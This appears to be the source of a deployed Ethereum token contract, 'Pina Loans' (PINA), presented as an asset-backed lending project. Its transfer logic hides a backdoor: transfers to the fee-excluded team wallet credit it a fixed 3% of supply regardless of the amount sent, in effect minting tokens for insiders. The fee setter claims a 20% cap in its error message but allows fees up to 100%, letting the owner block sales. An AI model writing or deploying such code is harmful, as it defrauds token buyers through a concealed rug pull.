// SPDX-License-Identifier: MIT

/*
Pina's mission is to construct and promote the adoption of technology aimed at bringing asset-backed financing onto the blockchain.

Website: https://pina.loans
Twitter: https://twitter.com/pina_loans
Telegram: https://t.me/pina_loans
Docs: https://medium.com/@pina.loans
*/

pragma solidity 0.8.21;

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function renounceOwnership() external onlyOwner {owner = address(0); emit OwnershipTransferred(address(0));}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IRouterV2 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract PINA is IERC20, Ownable {
    using SafeMath for uint256;

    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 10 ** 9 * 10 ** _decimals;

    string private constant _name = "Pina Loans";
    string private constant _symbol = "PINA";

    IRouterV2 _routerV2;
    address public pair;

    uint256 private numTaxSwaps;
    bool private inSwap;
    uint256 taxSwapAfter;

    uint256 private feeRateLp = 0;
    uint256 private feeRateMarketing = 0;
    uint256 private feeRateDev = 100;
    uint256 private feeRateBurn = 0;
    
    uint256 private buyFee = 1500;
    uint256 private sellFee = 1500;
    uint256 private transferFee = 1500;
    uint256 private denominator = 10000;
    uint256 public mTxSize = ( _totalSupply * 300 ) / 10000;
    uint256 public mBuySize = ( _totalSupply * 300 ) / 10000;
    uint256 public mHoldingSize = ( _totalSupply * 300 ) / 10000;

    uint256 private feeSwapMax = ( _totalSupply * 1000 ) / 100000;
    uint256 private feeSwapMin = ( _totalSupply * 10 ) / 100000;

    address internal devRecipient = 0xA61028c6852391624e50fb54F28D23D682B3f692; 
    address internal marketingRecipient = 0xA61028c6852391624e50fb54F28D23D682B3f692;
    address internal lpReceipient = 0xA61028c6852391624e50fb54F28D23D682B3f692;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;

    bool private startedTrading = false;
    bool private swapEnabled = true;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcludedFee;

    modifier lockSwap {inSwap = true; _; inSwap = false;}

    constructor() Ownable(msg.sender) {
        IRouterV2 _router = IRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        _routerV2 = _router; pair = _pair;
        isExcludedFee[msg.sender] = true;
        isExcludedFee[devRecipient] = true;
        isExcludedFee[marketingRecipient] = true;
        isExcludedFee[lpReceipient] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function getOwner() external view override returns (address) { return owner; }
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function startTrading() external onlyOwner {startedTrading = true;}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function takeFeeReceiver(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (isExcludedFee[recipient]) {return mTxSize;}
        if(getTaxAmount(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getTaxAmount(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(feeRateBurn > uint256(0) && getTaxAmount(sender, recipient) > feeRateBurn){_transfer(address(this), address(DEAD), amount.div(denominator).mul(feeRateBurn));}
        return amount.sub(feeAmount);} return amount;
    }

    function swapTokensToLiquidify(uint256 tokens) private lockSwap {
        uint256 _denominator = (feeRateLp.add(1).add(feeRateMarketing).add(feeRateDev)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(feeRateLp).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(feeRateLp));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(feeRateLp);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(feeRateMarketing);
        if(marketingAmt > 0){payable(marketingRecipient).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(devRecipient).transfer(contractBalance);}
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(_routerV2), tokenAmount);
        _routerV2.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpReceipient,
            block.timestamp);
    }

    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        feeRateLp = _liquidity; feeRateMarketing = _marketing; feeRateBurn = _burn; feeRateDev = _development; buyFee = _total; sellFee = _sell; transferFee = _trans;
        require(buyFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "buyFee and sellFee cannot be more than 20%");
    }

    function shouldSwapCa(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= feeSwapMin;
        bool aboveThreshold = balanceOf(address(this)) >= feeSwapMax;
        return !inSwap && swapEnabled && startedTrading && aboveMin && !isExcludedFee[sender] && recipient == pair && numTaxSwaps >= taxSwapAfter && aboveThreshold;
    }

    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _totalSupply.mul(_buy).div(10000); uint256 newTransfer = _totalSupply.mul(_sell).div(10000); uint256 newWallet = _totalSupply.mul(_wallet).div(10000);
        mTxSize = newTx; mBuySize = newTransfer; mHoldingSize = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }

    function getTaxAmount(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pair){return sellFee;}
        if(sender == pair){return buyFee;}
        return transferFee;
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isExcludedFee[sender] && !isExcludedFee[recipient]){require(startedTrading, "startedTrading");}
        if(!isExcludedFee[sender] && !isExcludedFee[recipient] && recipient != address(pair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= mHoldingSize, "Exceeds maximum wallet amount.");}
        if(sender != pair){require(amount <= mBuySize || isExcludedFee[sender] || isExcludedFee[recipient], "TX Limit Exceeded");}
        require(amount <= mTxSize || isExcludedFee[sender] || isExcludedFee[recipient], "TX Limit Exceeded"); 
        if(recipient == pair && !isExcludedFee[sender]){numTaxSwaps += uint256(1);}
        if(shouldSwapCa(sender, recipient, amount)){swapTokensToLiquidify(feeSwapMax); numTaxSwaps = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !isExcludedFee[sender] ? takeFeeReceiver(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _routerV2.WETH();
        _approve(address(this), address(_routerV2), tokenAmount);
        _routerV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }
}